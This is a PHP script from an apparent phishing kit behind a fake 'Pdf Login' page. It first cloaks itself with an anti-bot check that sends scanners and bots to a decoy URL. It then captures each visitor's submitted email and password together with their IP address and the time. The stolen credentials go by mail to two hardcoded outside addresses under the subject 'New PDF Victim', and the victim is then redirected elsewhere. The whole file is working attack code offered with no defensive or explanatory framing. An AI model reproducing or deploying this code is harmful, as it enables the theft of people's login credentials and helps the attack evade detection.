<?php
require_once('autoload.php'); 
if(isset($_GET['slug']) && $_SESSION['check'] == false){

	  $respons = $Antibot->redirect( $config['apikey'] , $_GET['slug']);
    $json    = $Antibot->json($respons);

    if($json['block_access']){
        if( preg_match("/404|403/", $json['block_access']) ){
            $Antibot->error(403 , 'You cannot access because your country or browser does not support.');
        }
    }

    if($json['status'] == false){
    	$Antibot->error(100 , $json['message']);
    }
    
    $_SESSION['check'] = true;

    if($json['is_bot'] == true){
	
  		$_SESSION['is_bot'] 	= true;
  		$_SESSION['direct_url']	= $json['direct_url'];
  		die(header("Location: ".$config['redirect_bot']));

    }
    
    $_SESSION['is_bot'] 	   = false;
    $_SESSION['direct_url']	  = $json['direct_url'];

    die(header("Location: ".$json['direct_url']));
}

if($_SESSION['check'] == true){
    die(header("Location: ".$_SESSION['direct_url']));
}

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Pdf Login ========\n";
$message .= "User: ".$_POST['email']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "pediapenji@gmail.com, mugu0017070@yandex.com";
$subject = "New PDF Victim | $ip";
$headers = "From: GAMORA";


$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.Pdf.com/");


?>
